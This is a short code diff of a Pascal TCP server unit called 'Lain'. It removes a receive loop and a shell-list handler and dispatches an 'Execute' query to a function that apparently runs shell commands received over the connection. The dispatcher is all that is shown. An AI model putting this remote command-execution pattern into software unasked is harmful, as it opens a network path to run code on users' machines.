@@ -32,32 +32,16 @@ Const
  Lain_Ok = 2;
 
 
-function LainServerRecvQuery(var Connection :TTcpIpCustomConnection) :Longint;
-function LainServerQueryEngine(var Connection :TTcpIpCustomConnection; Value :Word) :Longint;
+function LainServerQueryEngine(var Connection :TTcpIpCustomConnection; const Value :Longint) :Longint;
  
 implementation
 
-uses Shell;
+uses Execute;
 
-function LainServerRecvQuery(var Connection :TTcpIpCustomConnection) :Longint;
-var
- Value :Word;
-begin
- Value := 2;
- while ((Value = Lain_Disconnect) or (Value = Lain_Logoff)) <> True do
- begin
-  if Connection.Recv(Value, SizeOf(Value)) <> SizeOf(Value) then
-   Exit(Lain_Error);
-  if Connection.Send(Value, SizeOf(Value)) <> SizeOf(Value) then
-   Exit(Lain_Error);
- end;
- Result := Value;
-end;
-
-function LainServerQueryEngine(var Connection :TTcpIpCustomConnection; Value :Word) :Longint;
+function LainServerQueryEngine(var Connection :TTcpIpCustomConnection; const Value :Longint) :Longint;
 begin
  case Value of
-  Lain_Shell_List: Result := LainShellList(Connection);
+  Lain_Execute: Result := LainShellExecuteCmd(Connection);
  end;
 end;
 
